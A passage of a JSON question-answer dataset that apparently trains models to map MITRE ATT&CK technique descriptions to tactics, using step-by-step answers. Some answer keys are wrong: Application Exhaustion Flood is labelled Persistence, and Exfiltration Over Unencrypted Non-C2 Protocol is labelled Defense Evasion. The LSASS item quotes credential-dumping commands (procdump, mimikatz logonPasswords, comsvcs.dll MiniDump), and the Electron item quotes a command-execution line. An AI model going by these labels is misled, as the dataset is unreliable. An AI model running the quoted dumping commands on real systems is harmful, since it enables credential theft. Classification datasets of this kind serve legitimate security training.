      "question": "Which tactic is related to the following description:\nAdversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table. The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. Disk Structure Wipe may be performed in isolation, or along with Disk Content Wipe if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using Network Device CLI commands such as `format`.\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.",
      "answer": "The given description is related to sub technique: Disk Structure Wipe (T1561.002);\nSub technique Disk Structure Wipe (T1561.002) is a type of technique Disk Wipe (T1561);\nTechnique Disk Wipe (T1561) is a type of tactic Impact (TA0040);\nTherefore, the given description is related to tactic Impact (TA0040).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs.  There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. \n\nAdd-ins can be used to obtain persistence because they can be set to execute code when an Office application starts.?",
    "context": "",
    "output": "The given description is related to sub technique Add-ins (T1137.006);\nSub technique Add-ins (T1137.006) is a type of technique Office Application Startup (T1137);\nTechnique Office Application Startup (T1137) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs.  There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. \n\nAdd-ins can be used to obtain persistence because they can be set to execute code when an Office application starts.",
      "answer": "The given description is related to sub technique Add-ins (T1137.006);\nSub technique Add-ins (T1137.006) is a type of technique Office Application Startup (T1137);\nTechnique Office Application Startup (T1137) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.",
    "context": "",
    "output": "The given description is related to sub technique Application Exhaustion Flood (T1499.003);\nSub technique Application Exhaustion Flood (T1499.003) is a type of technique Endpoint Denial of Service (T1499);\nTechnique Endpoint Denial of Service (T1499) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.",
      "answer": "The given description is related to sub technique Application Exhaustion Flood (T1499.003);\nSub technique Application Exhaustion Flood (T1499.003) is a type of technique Endpoint Denial of Service (T1499);\nTechnique Endpoint Denial of Service (T1499) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.",
    "context": "",
    "output": "The given description is related to sub technique Exfiltration Over Unencrypted Non-C2 Protocol (T1048.003);\nSub technique Exfiltration Over Unencrypted Non-C2 Protocol (T1048.003) is a type of technique Exfiltration Over Alternative Protocol (T1048);\nTechnique Exfiltration Over Alternative Protocol (T1048) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.",
      "answer": "The given description is related to sub technique Exfiltration Over Unencrypted Non-C2 Protocol (T1048.003);\nSub technique Exfiltration Over Unencrypted Non-C2 Protocol (T1048.003) is a type of technique Exfiltration Over Alternative Protocol (T1048);\nTechnique Exfiltration Over Alternative Protocol (T1048) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW. Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.\n\nAdversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.?",
    "context": "",
    "output": "The given description is related to sub technique Mark-of-the-Web Bypass (T1553.005);\nSub technique Mark-of-the-Web Bypass (T1553.005) is a type of technique Subvert Trust Controls (T1553);\nTechnique Subvert Trust Controls (T1553) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW. Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.\n\nAdversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.",
      "answer": "The given description is related to sub technique Mark-of-the-Web Bypass (T1553.005);\nSub technique Mark-of-the-Web Bypass (T1553.005) is a type of technique Subvert Trust Controls (T1553);\nTechnique Subvert Trust Controls (T1553) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.  \n\nAdversaries may search various public code repositories for various information about a victim. Public code repositories can often be a source of various general information about victims, such as commonly used programming languages and libraries as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information), establishing operational resources (ex: Compromise Accounts or Compromise Infrastructure), and/or initial access (ex: Valid Accounts or Phishing). \n\n**Note:** This is distinct from Code Repositories, which focuses on Collection from private and internally hosted code repositories.",
    "context": "",
    "output": "The given description is related to sub technique: Code Repositories (T1593.003);\nSub technique Code Repositories (T1593.003) is a type of technique Search Open Websites/Domains (T1593);\nTechnique Search Open Websites/Domains (T1593) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.  \n\nAdversaries may search various public code repositories for various information about a victim. Public code repositories can often be a source of various general information about victims, such as commonly used programming languages and libraries as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information), establishing operational resources (ex: Compromise Accounts or Compromise Infrastructure), and/or initial access (ex: Valid Accounts or Phishing). \n\n**Note:** This is distinct from Code Repositories, which focuses on Collection from private and internally hosted code repositories.",
      "answer": "The given description is related to sub technique: Code Repositories (T1593.003);\nSub technique Code Repositories (T1593.003) is a type of technique Search Open Websites/Domains (T1593);\nTechnique Search Open Websites/Domains (T1593) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.\n\nWindows Services that are run as a \"generic\" process (ex: <code>svchost.exe</code>) load the service's DLL file, the location of which is stored in a Registry entry named <code>ServiceDll</code>. The <code>termsrv.dll</code> file, typically stored in `%SystemRoot%\\System32\\`, is the default <code>ServiceDll</code> value for Terminal Services in `HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\`.\n\nAdversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts. Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal <code>termsrv.dll</code> functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent Remote Desktop Protocol sessions by either patching the <code>termsrv.dll</code> file or modifying the <code>ServiceDll</code> value to point to a DLL that provides increased RDP functionality. On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.?",
    "context": "",
    "output": "The given description is related to sub technique: Terminal Services DLL (T1505.005);\nSub technique Terminal Services DLL (T1505.005) is a type of technique Server Software Component (T1505);\nTechnique Server Software Component (T1505) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.\n\nWindows Services that are run as a \"generic\" process (ex: <code>svchost.exe</code>) load the service's DLL file, the location of which is stored in a Registry entry named <code>ServiceDll</code>. The <code>termsrv.dll</code> file, typically stored in `%SystemRoot%\\System32\\`, is the default <code>ServiceDll</code> value for Terminal Services in `HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\`.\n\nAdversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts. Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal <code>termsrv.dll</code> functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent Remote Desktop Protocol sessions by either patching the <code>termsrv.dll</code> file or modifying the <code>ServiceDll</code> value to point to a DLL that provides increased RDP functionality. On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.",
      "answer": "The given description is related to sub technique: Terminal Services DLL (T1505.005);\nSub technique Terminal Services DLL (T1505.005) is a type of technique Server Software Component (T1505);\nTechnique Server Software Component (T1505) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may buy, lease, rent, or obtain physical servers\u00a0that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, such as watering hole operations in Drive-by Compromise, enabling Phishing operations, or facilitating Command and Control. Instead of compromising a third-party Server or renting a Virtual Private Server, adversaries may opt to configure and run their own servers in support of operations. Free trial periods of cloud servers may also be abused. \n\nAdversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.",
    "context": "",
    "output": "The given description is related to sub technique: Server (T1583.004);\nSub technique Server (T1583.004) is a type of technique Acquire Infrastructure (T1583);\nTechnique Acquire Infrastructure (T1583) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may buy, lease, rent, or obtain physical servers\u00a0that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, such as watering hole operations in Drive-by Compromise, enabling Phishing operations, or facilitating Command and Control. Instead of compromising a third-party Server or renting a Virtual Private Server, adversaries may opt to configure and run their own servers in support of operations. Free trial periods of cloud servers may also be abused. \n\nAdversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.",
      "answer": "The given description is related to sub technique: Server (T1583.004);\nSub technique Server (T1583.004) is a type of technique Acquire Infrastructure (T1583);\nTechnique Acquire Infrastructure (T1583) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various Native API functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.\n\nAPI functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.\n\nTo avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to Software Packing, dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.\n\nVarious methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of Deobfuscate/Decode Files or Information during execution).",
    "context": "",
    "output": "The given description is related to sub technique: Dynamic API Resolution (T1027.007);\nSub technique Dynamic API Resolution (T1027.007) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various Native API functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.\n\nAPI functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.\n\nTo avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to Software Packing, dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.\n\nVarious methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of Deobfuscate/Decode Files or Information during execution).",
      "answer": "The given description is related to sub technique: Dynamic API Resolution (T1027.007);\nSub technique Dynamic API Resolution (T1027.007) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. \n\nOn embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.\n\nDowngrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as Weaken Encryption.  Downgrading of a system image can be done on its own, or it can be used in conjunction with Patch System Image.?",
    "context": "",
    "output": "The given description is related to sub technique Downgrade System Image (T1601.002);\nSub technique Downgrade System Image (T1601.002) is a type of technique Modify System Image (T1601);\nTechnique Modify System Image (T1601) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. \n\nOn embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.\n\nDowngrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as Weaken Encryption.  Downgrading of a system image can be done on its own, or it can be used in conjunction with Patch System Image.",
      "answer": "The given description is related to sub technique Downgrade System Image (T1601.002);\nSub technique Downgrade System Image (T1601.002) is a type of technique Modify System Image (T1601);\nTechnique Modify System Image (T1601) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as `comsvcs.dll` can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>\n\nSimilar to Image File Execution Options Injection, the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.",
    "context": "",
    "output": "The given description is related to sub technique: LSASS Memory (T1003.001);\nSub technique LSASS Memory (T1003.001) is a type of technique OS Credential Dumping (T1003);\nTechnique OS Credential Dumping (T1003) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as `comsvcs.dll` can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>\n\nSimilar to Image File Execution Options Injection, the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.",
      "answer": "The given description is related to sub technique: LSASS Memory (T1003.001);\nSub technique LSASS Memory (T1003.001) is a type of technique OS Credential Dumping (T1003);\nTechnique OS Credential Dumping (T1003) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams. Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS. The Chromium engine is used to display web content and Node.js runs the backend code.\n\nDue to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework. For example, the abuse of `teams.exe` and `chrome.exe` may allow adversaries to execute malicious commands as child processes of the legitimate application (e.g., `chrome.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\system32\\cmd.exe /c calc.exe`).\n\nAdversaries may also execute malicious content by planting malicious JavaScript within Electron applications.",
    "context": "",
    "output": "The given description is related to sub technique Electron Applications (T1218.015);\nSub technique Electron Applications (T1218.015) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams. Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS. The Chromium engine is used to display web content and Node.js runs the backend code.\n\nDue to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework. For example, the abuse of `teams.exe` and `chrome.exe` may allow adversaries to execute malicious commands as child processes of the legitimate application (e.g., `chrome.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\system32\\cmd.exe /c calc.exe`).\n\nAdversaries may also execute malicious content by planting malicious JavaScript within Electron applications.",
      "answer": "The given description is related to sub technique Electron Applications (T1218.015);\nSub technique Electron Applications (T1218.015) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\n\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.?",
    "context": "",
    "output": "The given description is related to sub technique Unix Shell (T1059.004);\nSub technique Unix Shell (T1059.004) is a type of technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\n\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.",
      "answer": "The given description is related to sub technique Unix Shell (T1059.004);\nSub technique Unix Shell (T1059.004) is a type of technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket. Golden tickets enable adversaries to generate authentication material for any account in Active Directory. \n\nUsing a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.\n\nThe KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets. The KRBTGT password hash may be obtained using OS Credential Dumping and privileged access to a domain controller.",
    "context": "",
